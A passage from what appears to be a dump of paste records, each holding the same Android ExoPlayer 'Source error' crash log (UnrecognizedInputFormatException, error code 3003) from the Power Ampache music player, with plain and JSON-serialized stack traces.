stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
kcKEE6fE,2025-04-18T16:37:29.859319,powerampache,PHP,Friday 18th of April 2025 09:37:30 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360971329,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
khqg1D5d,2025-04-18T16:37:29.551987,powerampache,PHP,Friday 18th of April 2025 09:37:29 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970996,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
eDea9TXR,2025-04-18T16:37:29.394591,powerampache,PHP,Friday 18th of April 2025 09:37:29 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970858,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
a2GjxcWq,2025-04-18T16:37:29.234834,powerampache,PHP,Friday 18th of April 2025 09:37:29 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970711,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
t0qQCvUK,2025-04-18T16:37:29.081413,powerampache,PHP,Friday 18th of April 2025 09:37:29 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970569,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
rMd4SXCy,2025-04-18T16:37:28.881212,powerampache,PHP,Friday 18th of April 2025 09:37:29 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970273,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
rq0QK93p,2025-04-18T16:37:28.645421,powerampache,PHP,Friday 18th of April 2025 09:37:28 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

